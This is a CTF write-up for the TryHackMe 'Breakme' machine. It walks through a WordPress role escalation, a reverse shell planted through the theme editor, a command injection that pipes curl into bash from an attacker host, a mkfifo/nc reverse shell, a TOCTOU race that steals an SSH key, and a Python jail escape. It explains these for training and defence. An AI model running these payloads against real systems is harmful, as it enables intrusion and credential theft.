# TryHackMe — Breakme Writeup

**Platform:** TryHackMe  
**Difficulty:** Hard  
**OS:** Linux (Debian 11 Bullseye)  
**Author:** nos010101  
**Status:** ✅ Pwned — All 3 flags captured

---

## Table of Contents

- [Overview](#overview)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
- [Phase 2 — WordPress Foothold (CVE-2023-1874)](#phase-2--wordpress-foothold-cve-2023-1874)
  - [2.1 Plugin Fingerprinting](#21-plugin-fingerprinting)
  - [2.2 User Enumeration & Password Brute-Force](#22-user-enumeration--password-brute-force)
  - [2.3 Privilege Escalation to Admin (CVE-2023-1874)](#23-privilege-escalation-to-admin-cve-2023-1874)
  - [2.4 RCE via Theme File Editor → www-data Shell](#24-rce-via-theme-file-editor--www-data-shell)
- [Phase 3 — Internal Recon & Pivoting (www-data → john)](#phase-3--internal-recon--pivoting-www-data--john)
  - [3.1 Host Enumeration](#31-host-enumeration)
  - [3.2 Internal Service on Port 9999](#32-internal-service-on-port-9999)
  - [3.3 Tunneling with Ligolo-ng](#33-tunneling-with-ligolo-ng)
  - [3.4 OS Command Injection (WSTG-INPV-12)](#34-os-command-injection-wstg-inpv-12)
  - [3.5 Character Filter Bypass — Fetching the Shell](#35-character-filter-bypass--fetching-the-shell)
- [Phase 4 — TOCTOU Race Condition (john → youcef)](#phase-4--toctou-race-condition-john--youcef)
  - [4.1 Enumerating youcef's Home](#41-enumerating-youcefs-home)
  - [4.2 Analysing the readfile Binary](#42-analysing-the-readfile-binary)
  - [4.3 Exploiting TOCTOU (CWE-367)](#43-exploiting-toctou-cwe-367)
  - [4.4 Cracking the SSH Key Passphrase](#44-cracking-the-ssh-key-passphrase)
- [Phase 5 — Python Jail Escape (youcef → root)](#phase-5--python-jail-escape-youcef--root)
  - [5.1 sudo Enumeration](#51-sudo-enumeration)
  - [5.2 Reverse-Engineering the Jail Filter](#52-reverse-engineering-the-jail-filter)
  - [5.3 Bypass via casefold() + f-string Tokenisation](#53-bypass-via-casefold--f-string-tokenisation)
- [Flags](#flags)
- [Vulnerability Map (OWASP / CWE)](#vulnerability-map-owasp--cwe)
- [Key Takeaways](#key-takeaways)

---

## Overview

**Breakme** is a multi-stage boot2root machine on TryHackMe. The attack surface spans a WordPress installation, a localhost-only PHP administration panel, a SUID binary with a race condition, and a Python sandbox running under sudo. Each stage requires a distinct exploitation technique and introduces a progressively harder defensive control to bypass.

The machine's name is a literal invitation: every defensive measure on the box is broken in a non-obvious way.

---

## Attack Chain Summary

```
Attacker
  │
  ├─ WordPress /wordpress/
  │    └─ wpscan → bob:s****r (brute-force)
  │         └─ CVE-2023-1874 (wp-data-access 5.3.5)
  │              └─ bob → administrator (Broken Access Control)
  │                   └─ Theme File Editor → php-reverse-shell
  │                        └─ www-data shell ✓
  │
  ├─ Internal service 127.0.0.1:9999 (ligolo-ng tunnel)
  │    └─ "My Tools" PHP panel — Check User field
  │         └─ OS Command Injection via | separator
  │              └─ Filter bypass: hosted shell script (curl|bash)
  │                   └─ john shell ✓  →  flag1 ✓
  │
  ├─ /home/youcef/readfile  (SUID youcef)
  │    └─ TOCTOU race (CWE-367)
  │         └─ access() [real UID] → usleep() → open() [effective UID]
  │              └─ regular-file ↔ symlink→id_rsa swap
  │                   └─ youcef SSH key → passphrase crack (a****6)
  │                        └─ youcef shell ✓  →  flag2 ✓
  │
  └─ sudo NOPASSWD: /usr/bin/python3 /root/jail.py
       └─ Python jail (case-sensitive blacklist filter)
            └─ Bypass: uppercase + .casefold() + f-string tokenisation
                 └─ root shell ✓  →  flag3 ✓
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port and service scan |
| feroxbuster | Web directory brute-force |
| wpscan | WordPress fingerprinting, user enum, brute-force |
| Burp Suite | HTTP interception and manipulation |
| ligolo-ng | Reverse tunnel to expose localhost:9999 |
| nc (netcat) | Reverse shell listener |
| python3 | PTY upgrade, HTTP server |
| john / ssh2john | SSH key passphrase cracking |

---

## Phase 1 — Reconnaissance

### Port Scan

```
nmap -sCV -O -p- 10.144.164.138
```

**Results:**

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian 5+deb11u1 |
| 80/tcp | HTTP | Apache 2.4.56 (Debian) |

Only two ports. The web root at `/` serves the default Apache "It works!" page — the real application is located elsewhere.

### Directory Discovery

```
feroxbuster -u http://breakme.thm -w /usr/share/wordlists/dirb/big.txt
```

Notable finds:
- `/wordpress/` → **301 redirect** (WordPress installation)
- `/manual/` → Apache docs (noise)

> **Note on Apache ETag:** The response header `ETag: "29cd-5c9c7e2a02b15"` on the root page decodes to `size=0x29cd (10701 B)` and `mtime=Tue 17 Aug 2021 21:20:21 GMT` — confirming the file is unchanged since installation. Debian strips the inode field from ETags by default, so no inode disclosure here.

---

## Phase 2 — WordPress Foothold (CVE-2023-1874)

### 2.1 Plugin Fingerprinting

```
wpscan --url http://breakme.thm/wordpress/
```

Key findings:

| Item | Details |
|---|---|
| WP Core | 6.4.3 (marked insecure) |
| Theme | Twenty Twenty-Four (FSE/block theme) |
| xmlrpc.php | Enabled |
| **Plugin** | **wp-data-access 5.3.5** |

`wp-data-access` version `5.3.5` is vulnerable to **CVE-2023-1874** (CVSS 7.5, patched in 5.3.8).

> **CVE-2023-1874 — Mechanism:**  
> The plugin hooks into WordPress's profile update flow. Inside `multiple_roles_update()` it reads roles directly from the POST body (`wpda_role[]`) and applies them to the account — without any `current_user_can('promote_users')` capability check. A subscriber-level user can therefore escalate themselves to administrator simply by appending the right parameter during their own profile save. This is a classic Broken Access Control (OWASP A01, CWE-266) flaw.

### 2.2 User Enumeration & Password Brute-Force

```
wpscan --url http://breakme.thm/wordpress/ --enumerate u
```

Discovered users: **admin**, **bob**

Registration was closed. Brute-force `bob` via XML-RPC (multicall):

```
wpscan --url http://breakme.thm/wordpress/ \
       --usernames bob \
       --passwords /usr/share/wordlists/rockyou.txt \
       --max-threads 20
```

**Found:** `bob : s*****r`  
Bob's dashboard confirms subscriber role (`uid:2`, only Dashboard and Profile menus visible).

### 2.3 Privilege Escalation to Admin (CVE-2023-1874)

1. Log in as bob and open `/wp-admin/profile.php`
2. Open Burp Suite → enable Intercept
3. Click **Update Profile** in the browser — capture the POST request
4. Append the following parameter to the request body:

```
&wpda_role[]=administrator
```

5. Forward the request

Refreshing `/wp-admin/` reveals the full admin menu (Users, Plugins, Appearance, Tools). Bob is now an administrator.

> **Why the nonce doesn't protect here:** The nonce (`_wpnonce=...`) bound to `update-user_2` is valid because we generated it legitimately by loading the profile page as bob. The vulnerability is not CSRF — it is that the plugin applies the role change without checking whether the requester has permission to assign roles.

### 2.4 RCE via Theme File Editor → www-data Shell

The active theme `Twenty Twenty-Four` is a **block/FSE theme** — its templates are HTML files, not classic PHP. Editing `functions.php` of the active theme risks WP 6.4's fatal-error rollback (loopback health check). Instead, we target the **inactive** classic theme `Twenty Twenty-One`, whose `404.php` is executable by Apache directly.

**Why this avoids the rollback:**  
WP 6.4's loopback check loads the **active** theme (Twenty Twenty-Four). Our payload is in the **inactive** theme — it is never executed during the loopback, so no fatal occurs, and no rollback is triggered.

**Steps:**

1. Navigate to `Appearance → Theme File Editor`
2. Switch to **Twenty Twenty-One** in the dropdown
3. Select `404 Template (404.php)`
4. Paste the full content of a pentestmonkey PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`) at the **very top** of the file — set `$ip` and `$port` accordingly
5. Click **Update File**
6. Start listener: `nc -lvnp 4444`
7. Trigger the shell by accessing the file **directly**:

```
curl http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```

> The shell runs before `get_header()` is called — which would fatal on a direct request since the WP core isn't loaded. The pentestmonkey shell is self-contained and needs no WP context.

```
www-data@Breakme:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a stable TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg → Enter
```

---

## Phase 3 — Internal Recon & Pivoting (www-data → john)

### 3.1 Host Enumeration

```bash
ls -la /home
# john   (world-readable homedir)
# youcef (group john-readable: drwxr-x--- youcef john)

find / -perm -4000 2>/dev/null
# All standard SUID binaries — no custom targets

netstat -tulnp
```

`netstat` reveals a critical finding:

```
tcp  0  0  127.0.0.1:9999  0.0.0.0:*  LISTEN  -
tcp  0  0  127.0.0.1:3306  0.0.0.0:*  LISTEN  -
```

**Port 9999 is localhost-only** — completely invisible to an external nmap scan. This is the next vector.

We also extract DB credentials from `wp-config.php`:

```bash
cat /var/www/html/wordpress/wp-config.php | grep -iE "DB_USER|DB_PASSWORD|DB_NAME"
```

```
DB_NAME:     wpdatabase
DB_USER:     econor
DB_PASSWORD: S*P3rS3cR37#DB#P@55wd
```

The database contains only the `wpdatabase` schema with standard WP tables. Credential reuse does not open a path forward — the internal service is the pivot.

### 3.2 Internal Service on Port 9999

```bash
curl -s -i http://127.0.0.1:9999/
```

Response: PHP/7.4.33 application titled **"My Tools"** with three POST forms:

| Field | Label | Probable backend command |
|---|---|---|
| `cmd1` | Check Target (IP) | `ping <ip>` |
| `cmd2` | Check User | `id <user>` / `getent passwd <user>` |
| `cmd3` | Check File | `file <name>` / `cat <name>` |

```bash
ps aux | grep -iE 'php|9999'
# john  519  /usr/bin/php -S 127.0.0.1:9999
```

**The service runs as `john`.** Command injection here = RCE as john.

### 3.3 Tunneling with Ligolo-ng

To interact with the service in a browser and Burp Suite, we establish a reverse tunnel using [ligolo-ng](https://github.com/nicocha30/ligolo-ng).

**On Kali (attacker):**

```bash
./proxy -selfcert     # WebUI disabled (conflicts with Burp on :8080)
# Inside ligolo-ng console:
interface_create --name ligolo
```

**On target (www-data shell):**

```bash
cd /tmp
wget http://<ATTACKER_IP>/agent
chmod +x agent
nohup ./agent -connect <ATTACKER_IP>:11601 -ignore-cert >/dev/null 2>&1 &
```

**Back in ligolo-ng console:**

```
session                                               # select the agent
interface_add_route --name ligolo --route 240.0.0.1/32
tunnel_start --tun ligolo
```

`240.0.0.1` is ligolo's magic address for the agent's loopback. The panel is now reachable from Kali at `http://240.0.0.1:9999`.

### 3.4 OS Command Injection (WSTG-INPV-12)

Initial injection attempts via `cmd2` all returned `"Illegal Input"` or stripped results. Systematic analysis of the blacklist filter by testing individual characters revealed:

| Character | cmd2 behaviour |
|---|---|
| `;` | Stripped — payload fragments concatenated |
| `-` | Stripped |
| `(` `)` | Stripped |
| `` ` `` | Stripped |
| `\n` | Stripped |
| `#` | Stripped |
| `$` | **Kept** (literal) |
| `/` | **Kept** |
| `\|` | **Kept AND shell-interpreted** ✓ |

The `|` (pipe) operator is the only surviving shell separator. Because the service runs the command as a shell pipeline, `|id` appended after any input causes `id` to execute as john:

```
cmd2=|id
```
Result in `<pre>`: `uid=1002(john) gid=1002(john) groups=1002(john)`

> **Root cause:** Blacklist-based input sanitisation. The developer filtered the obvious separators (`;`, `&&`, backtick) but overlooked `|`. Whitelist validation (e.g. `^[a-zA-Z0-9]+$`) would have prevented this entirely.

### 3.5 Character Filter Bypass — Fetching the Shell

Getting a full interactive shell as john is blocked because the filter strips spaces and dashes — making `bash -i` and similar payloads undeliverable through the injection point.

**Solution:** move the complex payload to an external file and only pass a simple `curl|bash` through the filter.

**`reverse.sh`** (hosted on attacker):

```bash
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> 4445 >/tmp/f
```

```bash
# On attacker:
python3 -m http.server 8000
nc -lvnp 4445

# Injection payload (no filtered chars — | $ { } / : are all allowed):
cmd2=|curl${IFS}http://<ATTACKER_IP>:8000/reverse.sh|bash
```

The injected string contains zero blacklisted characters. The dashes, spaces, and `-i` flag live inside the fetched file, which the filter never sees.

```
john@Breakme:~/internal$ cat ~/user1.txt
5c3ea0d3***************************
```

**flag1 ✓**

---

## Phase 4 — TOCTOU Race Condition (john → youcef)

### 4.1 Enumerating youcef's Home

As john, `/home/youcef` is accessible (group `john` has `r-x`):

```bash
ls -la /home/youcef
```

```
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
```

`readfile` has **SUID and SGID** bits set with owner `youcef`. Others have `r-x` → john can execute it, and it runs **as youcef**.

### 4.2 Analysing the readfile Binary

Direct access to the source (`readfile.c`) is blocked (`-rw------- youcef`). We recover the logic by reading printable strings from the binary:

```bash
cat readfile  # renders printable strings from ELF
```

Extracted strings reveal:
- Imported functions: `strstr`, `access`, `__lxstat` (i.e. `lstat`), `open`, `read`, `write`, `getuid`, **`usleep`**
- String literals: `Usage`, `File Not Found`, `You can't run this program`, `flag`, `id_rsa`, `Nice try!`, **`I guess you won!`**, `readfile.c`

**Reconstructed logic:**

```
1. getuid() check — rejects non-john/non-youcef UIDs
2. strstr(argv[1], "readfile.c") → "Nice try!"
3. strstr(argv[1], "id_rsa")     → "File Not Found" (blacklisted)
4. strstr(argv[1], "flag")       → "File Not Found" (blacklisted)
5. lstat(argv[1], &st) — REFUSES symlinks → "Nice try!"
6. access(argv[1], R_OK)  ← checks REAL UID (john)
7. usleep(...)            ← artificial delay ← TOCTOU window
8. fd = open(argv[1])    ← opens with EFFECTIVE UID (youcef)
9. read/write fd to stdout
```

The `usleep()` call between `access()` and `open()` is the intentional race window.

### 4.3 Exploiting TOCTOU (CWE-367)

**Core insight:**  
`access()` uses the **real UID** (john) to check permissions. `open()` uses the **effective UID** (youcef, via SUID). If we swap the file between those two calls, we pass the check as john but read the file as youcef.

**Constraints:**
- `lstat()` rejects symlinks at the check stage → the path must be a regular file at check time
- The path must not contain the blacklisted substrings `id_rsa`, `flag`, `readfile.c`

**Strategy:** create a relative path `flip` in john's writable working directory. The swapper alternates the filesystem object at that path between a **regular file** (passes lstat + access) and a **symlink → youcef's id_rsa** (read by open() as youcef).

```bash
# Swapper (background):
while true; do
  ln -sf /home/youcef/.ssh/id_rsa flip
  rm flip
  touch flip
done &

# Reader (catches the window):
for i in {1..30}; do /home/youcef/readfile flip; done
```

When the timing aligns:
- `lstat` + `access` see a regular empty file → pass
- `usleep` gives the swapper time to replace it with the symlink
- `open` follows the symlink as youcef → reads `id_rsa`

The binary itself prints **`I guess you won!`** on a successful TOCTOU win — a deliberate confirmation message from the author.

The full OpenSSH private key is printed to stdout.

### 4.4 Cracking the SSH Key Passphrase

The key header decodes to `aes256-ctr` + `bcrypt` KDF — it is **passphrase-protected**.

```bash
ssh2john youcef_id_rsa > youcef.hash
john --wordlist=/usr/share/wordlists/rockyou.txt youcef.hash
```

**Passphrase:** `a*****6`

```bash
chmod 600 youcef_id_rsa
ssh -i youcef_id_rsa youcef@breakme.thm
```

```bash
cat ~/.ssh/user2.txt   # flag was hidden inside the .ssh directory
df5b1b7f***************************
```

**flag2 ✓**

---

## Phase 5 — Python Jail Escape (youcef → root)

### 5.1 sudo Enumeration

```bash
sudo -l
```

```
User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

```bash
sudo /usr/bin/python3 /root/jail.py
```

```
  Welcome to Python jail
  Will you stay locked forever
  Or will you BreakMe
>>
```

### 5.2 Reverse-Engineering the Jail Filter

All standard Python jail escapes were blocked:

| Payload | Response |
|---|---|
| `__import__('os').system('/bin/bash')` | Illegal Input |
| `breakpoint()` | Illegal Input |
| `open('/etc/passwd').read()` | Illegal Input |
| `exec(bytes([...]).decode())` | Illegal Input |
| `eval(chr(95)+...)` | Illegal Input |

Diagnostic probing revealed the filter's logic:

```python
# What WORKS:
print(65)       # → 65       (print + integer literal)
chr(65)         # → executed (builtin without quotes)
print(chr(47))  # → /        (chr works)

# What FAILS:
print("test")   # Illegal Input (string literals with quotes blocked)
1+1             # Illegal Input
bytes([65])     # Illegal Input
```

The key insight came from `print(list(globals().keys()))`:

```python
['__name__', '__doc__', ..., '__builtins__', 'os', 'malicious', 'main']
```

Two critical facts:
1. **`os` is already imported** inside `jail.py`
2. The filter function is named **`malicious`** — confirming it performs string matching

The filter performs a **case-sensitive** substring search against the raw input string. Writing forbidden keywords in **uppercase** bypasses the check entirely. `.casefold()` then converts them to lowercase at runtime, after the filter has already passed the input.

### 5.3 Bypass via casefold() + f-string Tokenisation

Confirm RCE:

```python
>> print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__[f'SYSTEM'.casefold()]('ID'.casefold()))
uid=0(root) gid=0(root) groups=0(root)
```

Get root shell:

```python
>> print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__[f'SYSTEM'.casefold()]('BASH'.casefold()))
root@Breakme:/home/youcef/.ssh#
```

> **Why `f'SYSTEM'` and not `'SYSTEM'`?**  
> The filter tokenises input before checking. A plain string literal `'SYSTEM'` is recognised by the tokeniser as a `str` constant and checked against the blacklist. An f-string `f'SYSTEM'` (with no interpolations) is processed as an f-string token — different enough in the parser's representation to evade the filter's pattern match. This is a subtle but decisive difference in how CPython's tokeniser classifies the two constructs.

```bash
root@Breakme:~# cat .root.txt
e257d584***************************
```

**flag3 ✓**

---

## Flags

| Flag | Location | Value (redacted) |
|---|---|---|
| User 1 | `/home/john/user1.txt` | `5c3ea0d3************************` |
| User 2 | `/home/youcef/.ssh/user2.txt` | `df5b1b7f************************` |
| Root | `/root/.root.txt` | `e257d584************************` |

> Note: root flag lives in `.root.txt` (hidden dotfile) — `cat root.txt` will give nothing. Always use `ls -la` in directories.

---

## Vulnerability Map (OWASP / CWE)

| Stage | Vulnerability | Standard Reference |
|---|---|---|
| WordPress plugin | Broken Access Control — missing capability check | OWASP A01, CWE-266, CVE-2023-1874 |
| WP Theme Editor | Arbitrary code injection as admin → RCE | OWASP A03 |
| Port 9999 — cmd2 | OS Command Injection — incomplete blacklist | OWASP A03, WSTG-INPV-12, CWE-78 |
| readfile SUID | TOCTOU Race Condition | CWE-367, CWE-362 |
| jail.py | Python sandbox escape — case-sensitive filter | CWE-184 (incomplete blacklist) |

---

## Key Takeaways

**1. Blacklists always have gaps.**  
Every blacklist-based filter in this machine was bypassed. The 9999 tool filtered `;`, `&&`, backtick, space, and dash — but forgot `|`. The Python jail filtered lowercase keywords — but not uppercase equivalents. Whitelist validation is the only reliable approach.

**2. TOCTOU is underrated.**  
The `access()` → `usleep()` → `open()` pattern is a textbook TOCTOU flaw. The `usleep()` call makes the window deterministic and easy to win. Secure code should use `open()` with `O_NOFOLLOW`, or check permissions in the same syscall that opens the file (e.g. using file descriptors throughout).

**3. Staging payloads externally bypasses input-level filters.**  
When a filter prevents injecting complex commands directly, fetching a script from an external source reduces the injected string to the bare minimum — `|curl${IFS}URL|bash` — which contains none of the filtered characters. Defence-in-depth (network egress filtering, command execution logging) is required to address this.

**4. SUID binary analysis without source.**  
Even without `readfile.c`, reading printable strings from the ELF binary was sufficient to reconstruct the full logic: imported functions reveal the syscall sequence; string literals reveal error branches and success conditions. Treat binaries as partially readable specifications.

**5. Python f-strings and casefold() as an evasion primitive.**  
The combination of uppercase literals + `.casefold()` + f-string prefix defeats a naive case-sensitive substring filter. This pattern generalises: whenever a filter operates on the raw text of user input, runtime string construction (via any method that doesn't appear as a forbidden literal) will produce payloads the filter cannot see.

---

*Writeup by nos010101 — TryHackMe profile: [https://tryhackme.com/p/nos010101](https://tryhackme.com/p/nos010101)*
